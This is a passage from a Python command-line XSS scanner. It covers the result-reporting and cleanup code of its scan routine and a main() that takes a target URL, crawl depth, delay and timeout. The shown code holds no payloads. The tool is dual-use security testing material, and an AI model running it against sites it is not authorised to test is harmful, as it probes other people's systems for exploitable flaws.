            if self.vulnerabilities:
                print(f"\n{Fore.RED}[{Fore.GREEN}CRITICAL{Fore.RED}] {Fore.WHITE}POPUP-VERIFIED VULNERABILITIES:")
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    print(f"{Fore.RED}[{i}] {Fore.WHITE}{vuln['type']} in {vuln['parameter']} (Score: {vuln['score']}/20) ✅ POPUP CONFIRMED")
            else:
                print(f"\n{Fore.GREEN}[{Fore.RED}SECURE{Fore.GREEN}] {Fore.WHITE}No popup-confirmed vulnerabilities found")
                if self.driver:
                    print(f"{Fore.GREEN}[{Fore.RED}INFO{Fore.GREEN}] {Fore.WHITE}All tests were verified with browser popup detection")
                else:
                    print(f"{Fore.YELLOW}[{Fore.RED}WARNING{Fore.YELLOW}] {Fore.WHITE}No browser verification - install ChromeDriver for popup verification")
            
            print(f"\n{Fore.GREEN}[{Fore.RED}FILES{Fore.GREEN}] {Fore.WHITE}Reports: {html_report}, {json_report}")
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[{Fore.RED}ABORT{Fore.YELLOW}] {Fore.WHITE}Scan interrupted")
        except Exception as e:
            print(f"\n{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Scan failed: {e}")
        finally:
            if self.driver:
                self.driver.quit()
                print(f"{Fore.GREEN}[{Fore.RED}CLEANUP{Fore.GREEN}] {Fore.WHITE}Browser driver closed")

def main():
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner - Fixed Version with Popup Verification')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Crawl depth (default: 2)')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests (default: 0.5)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[ERROR] URL must start with http:// or https://")
        sys.exit(1)
    
    scanner = XSSScanner(
        target_url=args.url,
        max_depth=args.depth,
        delay=args.delay,
        timeout=args.timeout
    )
    
    scanner.run_scan()

if __name__ == "__main__":
    main()